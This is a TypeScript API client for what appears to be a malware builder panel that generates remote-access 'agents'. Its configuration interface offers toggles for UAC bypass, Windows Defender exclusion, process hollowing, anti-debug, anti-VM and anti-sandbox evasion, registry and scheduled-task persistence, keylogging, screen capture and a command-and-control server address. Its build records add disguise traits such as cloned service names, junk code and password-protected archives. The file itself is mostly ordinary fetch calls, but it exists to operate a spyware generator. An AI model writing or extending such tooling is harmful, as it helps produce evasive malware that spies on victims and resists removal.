import { API_URL } from '../config';

export interface AgentBuild {
  _id: string;
  agentId: string;
  name: string;
  version: string;
  description?: string;
  createdAt: string;
  updatedAt: string;
  status: 'queued' | 'generating' | 'compiling' | 'packaging' | 'ready' | 'error' | 'cancelled';
  progress: number;
  downloadUrl?: string;
  archivePassword?: string;
  serviceName?: string;
  serviceDescription?: string;
  serviceVersion?: string;
  serviceCompany?: string;
  serviceProduct?: string;
  clonedService?: string;
  junkCodeLines?: number;
  entryPoint?: string;
  fileSize?: number;
  downloadCount?: number;
  features?: string[];
  metadata?: {
    serviceName?: string;
    clonedService?: string;
    password?: string;
    features?: string[];
    codeStructure?: any;
    junkCodeLines?: number;
    entryPoint?: string;
    codeSigningMetadata?: any;
    securityFeatures?: string[];
  };
  filePaths?: {
    exe?: string;
    msi?: string;
    zip?: string;
    cpp?: string;
    logs?: string;
  };
  errorMessage?: string;
  createdBy?: {
    _id: string;
    username: string;
    email: string;
  };
}

export interface AgentConfig {
  agentName: string;
  serviceName: string;
  description: string;
  enablePolymorphicNaming: boolean;
  enableUACBypass: boolean;
  enableDefenderExclusion: boolean;
  enableProcessHollowing: boolean;
  enableMemoryEvasion: boolean;
  enableAntiDebug: boolean;
  enableAntiVM: boolean;
  enableAntiSandbox: boolean;
  enableCodeObfuscation: boolean;
  enableStringEncryption: boolean;
  enableServiceInstallation: boolean;
  enableRegistryPersistence: boolean;
  enableScheduledTask: boolean;
  enableStartupFolder: boolean;
  serverUrl: string;
  serverPort: number;
  heartbeatInterval: number;
  reconnectAttempts: number;
  enableKeylogger: boolean;
  enableScreenCapture: boolean;
  enableFileManager: boolean;
  enableProcessManager: boolean;
  enableNetworkMonitor: boolean;
  enableSystemInfo: boolean;
}

export interface AgentTemplate {
  _id: string;
  name: string;
  description?: string;
  config: AgentConfig;
  isPublic: boolean;
  usageCount: number;
  lastUsedAt?: string;
  createdAt: string;
  updatedAt: string;
  createdBy?: {
    _id: string;
    username: string;
    email: string;
  };
}

interface GetBuildsParams {
  status?: string;
  page?: number;
  limit?: number;
}

const getAuthHeaders = () => {
  const token = localStorage.getItem('accessToken');
  return {
    'Content-Type': 'application/json',
    ...(token && { 'Authorization': `Bearer ${token}` })
  };
};

export const agentService = {
  /**
   * Generate a new agent build
   */
  async generateAgent(config: AgentConfig): Promise<AgentBuild> {
    const response = await fetch(`${API_URL}/agent/builds`, {
      method: 'POST',
      headers: getAuthHeaders(),
      body: JSON.stringify(config)
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to generate agent');
    }

    const data = await response.json();
    return data.data.build;
  },

  /**
   * Get all builds with optional filters
   */
  async getBuilds(params: GetBuildsParams = {}): Promise<{ builds: AgentBuild[]; total: number; page: number; limit: number }> {
    const queryParams = new URLSearchParams();
    if (params.status) queryParams.append('status', params.status);
    if (params.page) queryParams.append('page', params.page.toString());
    if (params.limit) queryParams.append('limit', params.limit.toString());

    const response = await fetch(`${API_URL}/agent/builds?${queryParams.toString()}`, {
      method: 'GET',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to fetch builds');
    }

    const data = await response.json();
    return {
      builds: data.data.builds,
      total: data.total,
      page: data.page,
      limit: data.limit
    };
  },

  /**
   * Get a single build by ID
   */
  async getBuild(buildId: string): Promise<AgentBuild> {
    const response = await fetch(`${API_URL}/agent/builds/${buildId}`, {
      method: 'GET',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to fetch build');
    }

    const data = await response.json();
    return data.data.build;
  },

  /**
   * Delete a build
   */
  async deleteBuild(buildId: string): Promise<void> {
    const response = await fetch(`${API_URL}/agent/builds/${buildId}`, {
      method: 'DELETE',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to delete build');
    }
  },

  /**
   * Download a build archive
   */
  async downloadBuild(buildId: string): Promise<Blob> {
    const response = await fetch(`${API_URL}/agent/builds/${buildId}/download`, {
      method: 'GET',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to download build');
    }

    return await response.blob();
  },

  /**
   * Get build logs
   */
  async getBuildLogs(buildId: string): Promise<string> {
    const response = await fetch(`${API_URL}/agent/builds/${buildId}/logs`, {
      method: 'GET',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to fetch build logs');
    }

    const data = await response.json();
    return data.data.logs;
  }
};

export const templateService = {
  /**
   * Get all templates
   */
  async getTemplates(params: { isPublic?: boolean; page?: number; limit?: number } = {}): Promise<{ templates: AgentTemplate[]; total: number; page: number; limit: number }> {
    const queryParams = new URLSearchParams();
    if (params.isPublic !== undefined) queryParams.append('isPublic', params.isPublic.toString());
    if (params.page) queryParams.append('page', params.page.toString());
    if (params.limit) queryParams.append('limit', params.limit.toString());

    const response = await fetch(`${API_URL}/agent/templates?${queryParams.toString()}`, {
      method: 'GET',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to fetch templates');
    }

    const data = await response.json();
    return {
      templates: data.data.templates,
      total: data.total,
      page: data.page,
      limit: data.limit
    };
  },

  /**
   * Get a single template
   */
  async getTemplate(templateId: string): Promise<AgentTemplate> {
    const response = await fetch(`${API_URL}/agent/templates/${templateId}`, {
      method: 'GET',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to fetch template');
    }

    const data = await response.json();
    return data.data.template;
  },

  /**
   * Create a template
   */
  async createTemplate(name: string, description: string, config: AgentConfig, isPublic: boolean = false): Promise<AgentTemplate> {
    const response = await fetch(`${API_URL}/agent/templates`, {
      method: 'POST',
      headers: getAuthHeaders(),
      body: JSON.stringify({ name, description, config, isPublic })
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to create template');
    }

    const data = await response.json();
    return data.data.template;
  },

  /**
   * Update a template
   */
  async updateTemplate(templateId: string, updates: { name?: string; description?: string; config?: AgentConfig; isPublic?: boolean }): Promise<AgentTemplate> {
    const response = await fetch(`${API_URL}/agent/templates/${templateId}`, {
      method: 'PUT',
      headers: getAuthHeaders(),
      body: JSON.stringify(updates)
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to update template');
    }

    const data = await response.json();
    return data.data.template;
  },

  /**
   * Delete a template
   */
  async deleteTemplate(templateId: string): Promise<void> {
    const response = await fetch(`${API_URL}/agent/templates/${templateId}`, {
      method: 'DELETE',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to delete template');
    }
  },

  /**
   * Use a template (load config)
   */
  async useTemplate(templateId: string): Promise<AgentConfig> {
    const response = await fetch(`${API_URL}/agent/templates/${templateId}/use`, {
      method: 'POST',
      headers: getAuthHeaders()
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Failed to use template');
    }

    const data = await response.json();
    return data.data.config;
  }
};
